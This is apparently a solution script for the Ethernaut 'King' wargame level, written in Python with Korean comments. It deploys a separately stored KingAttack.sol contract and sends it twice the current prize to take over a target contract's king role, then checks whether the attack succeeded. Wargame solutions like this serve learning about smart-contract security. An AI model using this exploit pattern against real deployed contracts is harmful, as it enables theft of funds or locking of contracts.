from web3 import Web3
from solcx import compile_source
from dotenv import dotenv_values

# 풀이
# 1. 

# 문제에서 사용하는 각종 정보 추출
ENV_PATH = "../.env"

dict_output = dotenv_values(ENV_PATH)

RPC_URI = dict_output['WEB3_PROVIDER_URI']

CONTRACT_ADDRESS = '0x06cd7788D77332cF1156f1E327eBC090B5FF16a3'
LEVEL_ADDRESS = '0x' + dict_output['ETHERNAUT_LEVEL09_ADDRESS']
PRIVATE_KEY = '0x' + dict_output['USER_ADDRESS_PRIVATE_KEY']

web3 = Web3(Web3.HTTPProvider(RPC_URI))

# 연결 확인
if web3.is_connected():
    print("Connected to Network!")
else:
    print("Failed to connect to Network.")
    
PA = web3.eth.account.from_key(PRIVATE_KEY)
USER_ADDRESS = PA.address

CONTRACT_ABI = [
    {
        "type": "constructor",
        "inputs": [],
        "stateMutability": "payable",
        "payable": True
    },
    {
        "type": "receive",
        "stateMutability": "payable",
        "payable": True
    },
    {
        "type": "function",
        "name": "_king",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x29cc6d6f"
    },
    {
        "type": "function",
        "name": "owner",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "address",
                "internalType": "address"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0x8da5cb5b"
    },
    {
        "type": "function",
        "name": "prize",
        "inputs": [],
        "outputs": [
            {
                "name": "",
                "type": "uint256",
                "internalType": "uint256"
            }
        ],
        "stateMutability": "view",
        "constant": True,
        "signature": "0xe3ac5d26"
    }
]

with open("./contract/KingAttack.sol", "r") as f:
    ATTACKER_SRC_DATA = f.read()

COMPILED_SOL = compile_source(ATTACKER_SRC_DATA, output_values=['abi', 'bin'])

contract_id, contract_interface = COMPILED_SOL.popitem()

ATTACKER_BYTECODE = contract_interface['bin']
ATTACKER_ABI = contract_interface['abi']

contract = web3.eth.contract(address=CONTRACT_ADDRESS, abi=CONTRACT_ABI)
attacker = web3.eth.contract(abi=ATTACKER_ABI, bytecode=ATTACKER_BYTECODE)

print("---- BEFORE TRANSACTION ----")

BEFORE_KING = contract.functions._king().call()
CURRENT_PRIZE = contract.functions.prize().call()

print(f"Contract's current king : {BEFORE_KING}")
print(f"Contract's current prize : {web3.from_wei(CURRENT_PRIZE, "ether")}\n")

# Attacker 컨트랙트 사전 배포
tx_hash = attacker.constructor(CONTRACT_ADDRESS).transact()

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)
print(f"Transaction Receipt: {receipt}\n")

ATTACKER_ADDRESS = receipt.contractAddress

# Attacker 컨트랙트 주소 연결
attacker = web3.eth.contract(address=ATTACKER_ADDRESS, abi=ATTACKER_ABI)

tx = attacker.functions.attack().build_transaction({
    "from": USER_ADDRESS,
    "value": CURRENT_PRIZE * 2,
    "gas": 100000,
    "gasPrice": web3.to_wei(0.000001, "ether"),
    "nonce": web3.eth.get_transaction_count(USER_ADDRESS),
})

signed_tx = web3.eth.account.sign_transaction(tx, PRIVATE_KEY)
tx_hash = web3.eth.send_raw_transaction(signed_tx.raw_transaction)

print(f"Transaction Hash: {web3.to_hex(tx_hash)}")

receipt = web3.eth.wait_for_transaction_receipt(tx_hash)

print(f"Transaction Receipt: {receipt}\n")

print("---- AFTER TRANSACTION ----")

AFTER_KING = contract.functions._king().call()

print(f"Contract's current king : {AFTER_KING}\n")

if BEFORE_KING != AFTER_KING:
    print("Attack Success!")
else:
    print("Attack Failed...")